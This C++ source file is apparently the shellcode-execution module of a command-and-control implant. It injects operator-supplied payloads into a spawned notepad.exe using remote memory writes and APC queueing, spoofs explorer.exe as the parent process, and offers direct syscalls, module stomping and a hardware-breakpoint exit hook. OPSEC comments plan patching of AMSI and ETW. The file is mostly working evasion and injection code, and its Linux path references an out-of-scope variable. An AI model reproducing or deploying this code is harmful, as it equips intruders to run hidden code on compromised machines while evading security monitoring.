#include "AssemblyExec.hpp"

#include <cstring>
#include <sstream>
#include <chrono>
#include <thread>

#include "Common.hpp"
#include "Tools.hpp"

#ifdef __linux__
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sstream>
#include <unistd.h>
#include <fcntl.h>
#elif _WIN32
#include <io.h>
#include <fcntl.h>

#include <syscall.hpp>
#endif

#define BUFSIZE 2048

// Max duration of the shellcode execution befor it's killed
const int maxDurationShellCode=120;

using namespace std;

// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
constexpr std::string_view moduleName = "assemblyExec";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) AssemblyExec* A_AssemblyExecConstructor() 
{
    return new AssemblyExec();
}

#else

__attribute__((visibility("default"))) AssemblyExec* AssemblyExecConstructor() 
{
    return new AssemblyExec();
}

#endif

AssemblyExec::AssemblyExec()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
	m_processToSpawn="";
	m_useSyscall=false;
	m_isModeProcess = true;
	m_isSpoofParent = true;
}

AssemblyExec::~AssemblyExec()
{
}


// OPSEC remove getHelp and getInfo strings from the beacon compilation
std::string AssemblyExec::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "assemblyExec:\n";
	info += "Execute shellcode in a process (notepad.exe), wait for the end of execution or a timeout (120 sec). Retrieve the output.\n";
	info += "Use -r to use a shellcode file.\n";
	info += "If -e or -d are given, use donut to create the shellcode.\n";
	info += "exemple:\n";
	info += "- assemblyExec thread/process\n";
	// info += "- assemblyExec setParentSpoof/unsetParentSpoof parentProcess\n";
	info += "- assemblyExec -r ./shellcode.bin\n";
	info += "- assemblyExec -e ./program.exe arg1 arg2...\n";
	info += "- assemblyExec -e ./Seatbelt.exe -group=system\n";
	info += "- assemblyExec -d ./test.dll method arg1 arg2...\n";
#endif
	return info;
}


#define modeThread "0"
#define modeProcess "1"


int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
	if(splitedCmd.size() == 2)
	{
		if(splitedCmd[1]=="thread")
		{
			m_isModeProcess = false;
			return 0;
		}
		else if(splitedCmd[1]=="process")
		{
			m_isModeProcess = true;
			return 0;
		}
		else
		{
			c2Message.set_returnvalue(getInfo());
			return -1;
		}
	}
	else if (splitedCmd.size() >= 3)
	{
		bool donut=false;
		std::string inputFile=splitedCmd[2];
		std::string method;
		std::string args;
		int pid=-1;

		if(splitedCmd[1]=="-e")
		{
			donut=true;
			for (int idx = 3; idx < splitedCmd.size(); idx++) 
			{
				if(!args.empty())
					args+=" ";
				args+=splitedCmd[idx];
			}
		}
		else if(splitedCmd[1]=="-d")
		{
			donut=true;
			if(splitedCmd.size() > 3)
				method=splitedCmd[3];
			else
			{
				std::string msg = "Method is mandatory for DLL.\n";
				c2Message.set_returnvalue(msg);
				return -1;
			}
			for (int idx = 4; idx < splitedCmd.size(); idx++) 
			{
				if(!args.empty())
					args+=" ";
				args+=splitedCmd[idx];
			}
		}
		else if(splitedCmd[1]=="-r")
		{
		}
		else
		{
			std::string msg = "One of the tags, -r, -e or -d must be provided.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		if(inputFile.empty())
		{
			std::string msg = "A file name have to be provided.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		std::ifstream myfile;
		myfile.open(inputFile, std::ios::binary);

		if(!myfile)
		{
			std::string newInputFile=m_toolsDirectoryPath;
			newInputFile+=inputFile;
			myfile.open(newInputFile, std::ios::binary);
			inputFile=newInputFile;
		}

		if(!myfile) 
		{
			std::string msg = "Couldn't open file.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}
		myfile.close();

		std::string payload;
		if(donut)
		{
			// if we create a process we need to exite process with donut shellcode
			// Otherwise we exite the thread
			creatShellCodeDonut(inputFile, method, args, payload, true);
		}
		else
		{
			std::ifstream input(inputFile, std::ios::binary);
			std::string payload_(std::istreambuf_iterator<char>(input), {});
			payload=payload_;
		}

		if(payload.size()==0)
		{
			std::string msg = "Something went wrong. Payload empty.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		std::string cmd;
		for (int idx = 1; idx < splitedCmd.size(); idx++) 
		{
			cmd+=splitedCmd[idx];
			cmd+=" ";
		}

		if(m_isModeProcess == false)
			c2Message.set_args(modeThread);
		else
			c2Message.set_args(modeProcess);
		c2Message.set_pid(pid);
		c2Message.set_cmd(cmd);
		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(payload.data(), payload.size());
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}
#endif
	return 0;
}


int AssemblyExec::initConfig(const nlohmann::json &config)
{
	for (auto& it : config.items())
	{
		if(it.key()=="process")
			m_processToSpawn = it.value();
		else if(it.key()=="syscall")
			m_useSyscall = true;
		// put the parent spoof ??
			
	}

	return 0;
}


int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	std::string mode = c2Message.args();
	if(!mode.empty())
	{
		if(mode==modeThread)
			m_isModeProcess = false;
		else if(mode==modeProcess)
			m_isModeProcess = true;
	}

	const std::string payload = c2Message.data();

	std::string result;

#ifdef __linux__

	whateverLinux(result);

#elif _WIN32

	std::string processToSpawn="notepad.exe";
	std::string spoofedParent="explorer.exe";
	if(!m_processToSpawn.empty())
		processToSpawn=m_processToSpawn;

	if(m_isModeProcess && !m_isSpoofParent)
		createNewProcess(payload, processToSpawn, result);
	if(m_isModeProcess && m_isSpoofParent)
		createNewProcessWithSpoofedParent(payload, processToSpawn, spoofedParent, result);
	else
		createNewThread(payload, result);

#endif

	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd(c2Message.cmd());
	c2RetMessage.set_returnvalue(result);
	
	return 0;
}


#ifdef __linux__


int AssemblyExec::whateverLinux(std::string& result)
{
	if(1)
	{
		pid_t pid = 0;
		int pipefd[2];

		int ret = pipe(pipefd); //create a pipe
		pid = fork(); //spawn a child process
		if (pid == 0)
		{
			// Child. redirect std output to pipe, launch process
			close(pipefd[0]);
			dup2(pipefd[1], STDOUT_FILENO);

			void *page = mmap(NULL, payload.size(), PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
			memcpy(page, payload.data(), payload.size());
			mprotect(page, payload.size(), PROT_READ|PROT_EXEC);
			((void(*)())page)();
			exit(0);
		}

		pid_t child_process_pid = pid;
		int child_process_output_fd = pipefd[0];

		//Only parent gets here. make tail nonblocking.
		close(pipefd[1]);
		fcntl(pipefd[0], F_SETFL, fcntl(pipefd[0], F_GETFL) | O_NONBLOCK);

		std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now();
		while(1)
		{
			int status;
			pid_t endID=waitpid(child_process_pid, &status, WNOHANG);
			if (endID == -1)           
				break;
			else if (endID == 0) 
			{ 
				std::chrono::steady_clock::time_point now = std::chrono::steady_clock::now();
				auto elapse = std::chrono::duration_cast<std::chrono::seconds>(now - begin).count();
				if(elapse>=maxDurationShellCode)
				{
					kill(pid, SIGKILL);
					break;
				}
				else
					sleep(1);
			}
		}

		char buf[1000];
		int nbBytes=1;
		while(nbBytes)
		{
			nbBytes = read(child_process_output_fd, buf, 1000);
			if(nbBytes)
				result+=buf;
		}
	}

	if(0)
	{
		// inject in an other thread -> work but i cannot get the output
		streambuf* oldCoutStreamBuf = cout.rdbuf();
		ostringstream strCout;
		cout.rdbuf( strCout.rdbuf() );
		
		std::thread t1(execShellCode, payload);
		if(t1.joinable())
			t1.join();

		cout.rdbuf( oldCoutStreamBuf );
		cout << strCout.str();
	}

	if(0)
	{
		// inject here  -> work but terminate the process
		void *page = mmap(NULL, payload.size(), PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
		memcpy(page, payload.data(), payload.size());
		mprotect(page, payload.size(), PROT_READ|PROT_EXEC);
		((void(*)())page)();
	}
}


#elif _WIN32


LONG WINAPI handlerRtlExitUserProcess(EXCEPTION_POINTERS * ExceptionInfo) 
{
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) 
	{
		BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlExitUserProcess");
		if (ExceptionInfo->ContextRecord->Rip == (DWORD64) baseAddress) 
		{
			// printf("[!] Exception (%#llx)! Params:\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
			// printf("(1): %#d | ", ExceptionInfo->ContextRecord->Rcx);
			// printf("(2): %#llx | ", ExceptionInfo->ContextRecord->Rdx);
			// printf("(3): %#llx | ", ExceptionInfo->ContextRecord->R8);
			// printf("(4): %#llx | ", ExceptionInfo->ContextRecord->R9);
			// printf("RSP = %#llx\n", ExceptionInfo->ContextRecord->Rsp);
			
			// printf("RtlExitUserProcess called!\n");
			
			// continue the execution
			ExceptionInfo->ContextRecord->EFlags |= (1 << 16);			// set RF (Resume Flag) to continue execution
			//ExceptionInfo->ContextRecord->Rip++;						// or skip the breakpoint via instruction pointer
			ExceptionInfo->ContextRecord->Rip = (DWORD64)GetProcAddress(GetModuleHandle("Kernel32.dll"), "ExitThread");
		}		
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}


int SetHWBP(HANDLE thrd, DWORD64 addr, BOOL setBP) 
{
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_ALL;

	GetThreadContext(thrd, &ctx);
	
	if (setBP == TRUE) {
		ctx.Dr0 = addr;
		ctx.Dr7 |= (1 << 0);  		// Local DR0 breakpoint
		ctx.Dr7 &= ~(1 << 16);		// break on execution
		ctx.Dr7 &= ~(1 << 17);

	}
	else if (setBP == FALSE) {
		ctx.Dr0 = NULL;
		ctx.Dr7 &= ~(1 << 0);
	}

	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;	
	SetThreadContext(thrd, &ctx);

	return 0;
}


// Create new thread to run the shellcode, the memory use to inject the payload is taken from a DLL (Module Stomping)
// loaded specialy for this purpose. It avoid to use VirtualAlloc.
int AssemblyExec::createNewThread(const std::string& payload, std::string& result)
{
	StdCapture stdCapture;
	stdCapture.BeginCapture();

	char * ptr;
	
	// Module stomping
	bool isModuleStomping = false;
	if(isModuleStomping)
	{
		unsigned char sLib[] = "HologramWorld.dll";
		HMODULE hVictimLib = LoadLibrary((LPCSTR) sLib);
		ptr = (char *) hVictimLib + 2*4096 + 12;

		DWORD oldprotect = 0;
		VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_READWRITE, &oldprotect);
		RtlMoveMemory(ptr, (void *)payload.data(), payload.size());
	    VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_EXECUTE_READ, &oldprotect);
	}
	else
	{
		DWORD oldprotect = 0;
		ptr = (char *) VirtualAlloc(NULL, payload.size()+4096, MEM_COMMIT, PAGE_READWRITE);
		RtlMoveMemory(ptr, (void *)payload.data(), payload.size());
	    VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_EXECUTE_READ, &oldprotect);
	}
	
	HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, CREATE_SUSPENDED, 0);

	AddVectoredExceptionHandler(0, &handlerRtlExitUserProcess);
	BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlExitUserProcess");
	DWORD64 dword64Address = reinterpret_cast<uintptr_t>(baseAddress);
	SetHWBP(thread, (DWORD64) dword64Address, TRUE);

	if (thread != NULL) 
		ResumeThread(thread);

	WaitForSingleObject(thread, maxDurationShellCode*1000);

	stdCapture.EndCapture();
	result+=stdCapture.GetCapture();

	return 0;
}


// OPSEC function to switch to syscall
// OPSEC patch etw et amsi
// 		 difficulte to do with the fact that we create the thread suspended and so the lib are not loaded yet.
// OPSEC function to choose the process to inject to


DWORD GetPidByName(const char * pName) 
{
	PROCESSENTRY32 pEntry;
	HANDLE snapshot;

	pEntry.dwSize = sizeof(PROCESSENTRY32);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &pEntry) == TRUE) 
	{
		while (Process32Next(snapshot, &pEntry) == TRUE) 
		{
			if (_stricmp(pEntry.szExeFile, pName) == 0) 
			{
				return pEntry.th32ProcessID;
			}
		}
	}
	CloseHandle(snapshot);
	return 0;
}


// Create a new process in suspended mode to run the shellcode.
int AssemblyExec::createNewProcessWithSpoofedParent(const std::string& payload, const std::string& processToSpawn, const std::string& spoofedParent, std::string& result)
{
	// Init handles
	HANDLE hChildStdOutRd = NULL;
	HANDLE hChildStdOutWr = NULL;
	HANDLE hChildStdErrRd = NULL;
	HANDLE hChildStdErrWr = NULL;
	HANDLE hParentStdOutWr = NULL;
	HANDLE hParentStdErrWr = NULL;

	// Set the bInheritHandle flag so pipe handles are inherited. 
	SECURITY_ATTRIBUTES sa; 
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); 
    sa.bInheritHandle = TRUE; 
    sa.lpSecurityDescriptor = NULL; 
    
    CreatePipe(&hChildStdErrRd, &hChildStdErrWr, &sa, 0);
	// hChildStdErrWr = CreateFile("C:\\Users\\CyberVuln\\Desktop\\err.log", FILE_APPEND_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, &sa, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );

	CreatePipe(&hChildStdOutRd, &hChildStdOutWr, &sa, 0);
	// std::string pipeStdOut = "\\\\.\\pipe\\MyNamedPipe";
	// int bufferSize = 512;
	// hChildStdOutRd = CreateNamedPipeA(pipeStdOut.c_str(), PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, bufferSize, bufferSize, 0, &sa);
	// hChildStdOutWr = CreateFileA(pipeStdOut.c_str(), GENERIC_READ | GENERIC_WRITE, 0, &sa, OPEN_EXISTING, 0, NULL); 
	    
    // Prepare the parent child spoofing
	DWORD dwPid = 0;
	dwPid = GetPidByName(spoofedParent.c_str());
	if (dwPid == 0)
		dwPid = GetCurrentProcessId();

    HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hParentProcess) 
	{
		// result += "Error: Failed to open parent process." << GetLastError() << "\n";
        return 0;
    }

	// Duplicate handles to the spoofed parent process
	BOOL res = DuplicateHandle(GetCurrentProcess(), hChildStdOutWr, hParentProcess, &hParentStdOutWr, 0, TRUE, DUPLICATE_SAME_ACCESS);
	res = DuplicateHandle(GetCurrentProcess(), hChildStdErrWr, hParentProcess, &hParentStdErrWr, 0, TRUE, DUPLICATE_SAME_ACCESS);

    // Set up members of the STARTUPINFOEX structure to specifies the STDERR and STDOUT handles for redirection.
	STARTUPINFOEX siStartInfo = {};
    siStartInfo.StartupInfo.cb = sizeof(STARTUPINFOEX);
    siStartInfo.StartupInfo.hStdError = hParentStdErrWr;
    siStartInfo.StartupInfo.hStdOutput = hParentStdOutWr;
    siStartInfo.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;

	// Set up attributeList to set up the parent process
    SIZE_T attributeListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeListSize);

    PPROC_THREAD_ATTRIBUTE_LIST  attributeList = (PPROC_THREAD_ATTRIBUTE_LIST )HeapAlloc(GetProcessHeap(), 0, attributeListSize);
    if (!attributeList) 
	{
		// result += "Error: Failed to allocate memory for attribute list." << GetLastError() << "\n";

		CloseHandle(hChildStdErrWr);
		CloseHandle(hChildStdOutWr);
		CloseHandle(hChildStdErrRd);
		CloseHandle(hChildStdOutRd);
		DuplicateHandle(hParentProcess, hParentStdOutWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
		DuplicateHandle(hParentProcess, hParentStdErrWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
		CloseHandle(hParentProcess);

        return 0;
    }

    if (!InitializeProcThreadAttributeList(attributeList, 1, 0, &attributeListSize)) 
	{
		// result += "Error: Failed to initialize attribute list." << GetLastError() << "\n";
		
        HeapFree(GetProcessHeap(), 0, attributeList);

		CloseHandle(hChildStdErrWr);
		CloseHandle(hChildStdOutWr);
		CloseHandle(hChildStdErrRd);
		CloseHandle(hChildStdOutRd);
		DuplicateHandle(hParentProcess, hParentStdOutWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
		DuplicateHandle(hParentProcess, hParentStdErrWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
		CloseHandle(hParentProcess);

        return 0;
    }

    if (!UpdateProcThreadAttribute(attributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) 
	{
		// result += "Error: Failed to set parent process attribute." << GetLastError() << "\n";

        DeleteProcThreadAttributeList(attributeList);
        HeapFree(GetProcessHeap(), 0, attributeList);

		CloseHandle(hChildStdErrWr);
		CloseHandle(hChildStdOutWr);
		CloseHandle(hChildStdErrRd);
		CloseHandle(hChildStdOutRd);
		DuplicateHandle(hParentProcess, hParentStdOutWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
		DuplicateHandle(hParentProcess, hParentStdErrWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
		CloseHandle(hParentProcess);

        return 0;
    }

	siStartInfo.lpAttributeList = attributeList;

    // Create the child process
	PROCESS_INFORMATION piProcInfo; 
	ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );
	bool bSuccess = CreateProcessA(NULL, const_cast<LPSTR>(processToSpawn.c_str()), NULL, NULL, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siStartInfo.StartupInfo, &piProcInfo);

    DeleteProcThreadAttributeList(attributeList);
	HeapFree(GetProcessHeap(), 0, attributeList);

    // If an error occurs, exit the application. 
    if ( ! bSuccess ) 
	{
		CloseHandle(hChildStdErrWr);
		CloseHandle(hChildStdOutWr);
		CloseHandle(hChildStdErrRd);
		CloseHandle(hChildStdOutRd);
		DuplicateHandle(hParentProcess, hParentStdOutWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
		DuplicateHandle(hParentProcess, hParentStdErrWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
		CloseHandle(hParentProcess);

		// result += "Error: Process failed to start." << GetLastError() << "\n";
		return -1;
    }

	PVOID remoteBuffer;
	if(m_useSyscall)
	{
		// https://github.com/0xrob/XOR-Shellcode-QueueUserAPC-Syscall/blob/main/queueUserAPC-XOR/Source.cpp
		SIZE_T sizeToAlloc = payload.size();

		Sw3NtAllocateVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), 0);
		
		ULONG oldAccess;
		Sw3NtProtectVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);

		Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, NULL, NULL);
		Sw3NtResumeThread_(piProcInfo.hThread, NULL);
	}
	else
	{
		remoteBuffer = VirtualAllocEx(piProcInfo.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

		WriteProcessMemory(piProcInfo.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);

		DWORD oldprotect = 0;
		VirtualProtectEx(piProcInfo.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);

		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
		QueueUserAPC((PAPCFUNC)apcRoutine, piProcInfo.hThread, NULL);
		ResumeThread(piProcInfo.hThread);
	}

	m_isProcessRuning=true;
	m_processHandle = piProcInfo.hProcess;
	std::thread thread([this] { killProcess(); });

	// TODO replace the killProcess by a timeout here to avoid poping a thread ?
	WaitForSingleObject(piProcInfo.hProcess, INFINITE);
	
	DWORD dwRead; 
    CHAR chBuf[BUFSIZE];
    bSuccess = FALSE;
    std::string out = "";
	std::string err = "";
	DWORD bytesAvail = 0;
	BOOL isOK = PeekNamedPipe(hChildStdOutRd, NULL, 0, NULL, &bytesAvail, NULL);
	if(isOK && bytesAvail!=0)
		for (;;) 
		{ 
			bSuccess=ReadFile( hChildStdOutRd, chBuf, BUFSIZE-1, &dwRead, NULL);
			if( ! bSuccess || dwRead == 0 ) 
				break; 

			std::string s(chBuf, dwRead);
			out += s;

			if( ! bSuccess || dwRead < BUFSIZE-1 ) 
				break; 
		} 
    dwRead = 0;
	bytesAvail = 0;
	isOK = PeekNamedPipe(hChildStdErrRd, NULL, 0, NULL, &bytesAvail, NULL);
	if(isOK && bytesAvail!=0)
		for (;;) 
		{ 
			bSuccess=ReadFile( hChildStdErrRd, chBuf, BUFSIZE, &dwRead, NULL);

			if( ! bSuccess || dwRead == 0 ) 
				break; 

			std::string s(chBuf, dwRead);
			err += s;
			if( ! bSuccess || dwRead < BUFSIZE-1 ) 
				break; 
		} 

	m_isProcessRuning = false;
	CloseHandle(hChildStdErrWr);
    CloseHandle(hChildStdOutWr);
	CloseHandle(hChildStdErrRd);
    CloseHandle(hChildStdOutRd);
	DuplicateHandle(hParentProcess, hParentStdOutWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
	DuplicateHandle(hParentProcess, hParentStdErrWr, GetCurrentProcess(), NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
	CloseHandle(hParentProcess);

	thread.join();

	result += "Stdout:\n";
	result += out;
	result += "\n";
	if(!err.empty())
	{
		result += "Stderr:\n";
		result += err;
		result += "\n";
	}

	CloseHandle(piProcInfo.hProcess);
	CloseHandle(piProcInfo.hThread);

	return 0;
}


int AssemblyExec::createNewProcess(const std::string& payload, const std::string& processToSpawn, std::string& result)
{
	HANDLE hChildStdOutRd = NULL;
	HANDLE hChildStdOutWr = NULL;
	HANDLE hChildStdErrRd = NULL;
	HANDLE hChildStdErrWr = NULL;

	SECURITY_ATTRIBUTES sa; 
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); 
    sa.bInheritHandle = TRUE; 
    sa.lpSecurityDescriptor = NULL; 

    CreatePipe(&hChildStdErrRd, &hChildStdErrWr, &sa, 0);
    SetHandleInformation(hChildStdErrRd, HANDLE_FLAG_INHERIT, 0);

    CreatePipe(&hChildStdOutRd, &hChildStdOutWr, &sa, 0);
    SetHandleInformation(hChildStdOutRd, HANDLE_FLAG_INHERIT, 0);
	
    // Create the child process. 
    PROCESS_INFORMATION piProcInfo; 
	ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );


    // Set up members of the STARTUPINFO structure. 
    // This structure specifies the STDERR and STDOUT handles for redirection.
	STARTUPINFO siStartInfo;
    ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
    siStartInfo.cb = sizeof(STARTUPINFO); 
    siStartInfo.hStdError = hChildStdErrWr;
    siStartInfo.hStdOutput = hChildStdOutWr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create the child process. 
	bool bSuccess = CreateProcess(NULL, const_cast<LPSTR>(processToSpawn.c_str()), NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &siStartInfo, &piProcInfo);
    CloseHandle(hChildStdErrWr);
    CloseHandle(hChildStdOutWr);

    // If an error occurs, exit the application. 
    if ( ! bSuccess ) 
	{
		result += "Error: Process failed to start.\n";
		return -1;
    }

	PVOID remoteBuffer;
	if(m_useSyscall)
	{
		// https://github.com/0xrob/XOR-Shellcode-QueueUserAPC-Syscall/blob/main/queueUserAPC-XOR/Source.cpp
		SIZE_T sizeToAlloc = payload.size();

		Sw3NtAllocateVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), 0);
		
		ULONG oldAccess;
		Sw3NtProtectVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);

		Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, NULL, NULL);
		Sw3NtResumeThread_(piProcInfo.hThread, NULL);
	}
	else
	{
		remoteBuffer = VirtualAllocEx(piProcInfo.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

		WriteProcessMemory(piProcInfo.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);

		DWORD oldprotect = 0;
		VirtualProtectEx(piProcInfo.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);

		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
		QueueUserAPC((PAPCFUNC)apcRoutine, piProcInfo.hThread, NULL);
		ResumeThread(piProcInfo.hThread);
	}

	m_isProcessRuning=true;
	m_processHandle = piProcInfo.hProcess;
	std::thread thread([this] { killProcess(); });

	DWORD dwRead; 
    CHAR chBuf[BUFSIZE];
    bSuccess = FALSE;
    std::string out = "";
	std::string err = "";
    DWORD bytesAvail = 0;
	BOOL isOK = PeekNamedPipe(hChildStdOutRd, NULL, 0, NULL, &bytesAvail, NULL);
	if(isOK && bytesAvail!=0)
		for (;;) 
		{ 
			bSuccess=ReadFile( hChildStdOutRd, chBuf, BUFSIZE-1, &dwRead, NULL);
			if( ! bSuccess || dwRead == 0 ) 
				break; 

			std::string s(chBuf, dwRead);
			out += s;

			if( ! bSuccess || dwRead < BUFSIZE-1 ) 
				break; 
		} 
    dwRead = 0;
	bytesAvail = 0;
	isOK = PeekNamedPipe(hChildStdErrRd, NULL, 0, NULL, &bytesAvail, NULL);
	if(isOK && bytesAvail!=0)
		for (;;) 
		{ 
			bSuccess=ReadFile( hChildStdErrRd, chBuf, BUFSIZE, &dwRead, NULL);

			if( ! bSuccess || dwRead == 0 ) 
				break; 

			std::string s(chBuf, dwRead);
			err += s;
			if( ! bSuccess || dwRead < BUFSIZE-1 ) 
				break; 
		} 

	m_isProcessRuning = false;
	CloseHandle(hChildStdErrRd);
    CloseHandle(hChildStdOutRd);
  	
	thread.join();

	result += "Stdout:\n";
	result += out;
	result += "\n";
	if(!err.empty())
	{
		result += "Stderr:\n";
		result += err;
		result += "\n";
	}

	CloseHandle(piProcInfo.hProcess);
	CloseHandle(piProcInfo.hThread);

	return 0;
}


int AssemblyExec::killProcess()
{
	std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now();
	while (1)
	{
		if (!m_isProcessRuning) 
			break;

		std::chrono::steady_clock::time_point now = std::chrono::steady_clock::now();
		auto elapse = std::chrono::duration_cast<std::chrono::seconds>(now - begin).count();
		if(elapse>=maxDurationShellCode)
		{
			TerminateProcess(m_processHandle, 0);
			break;
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}

	return 0;
}

#endif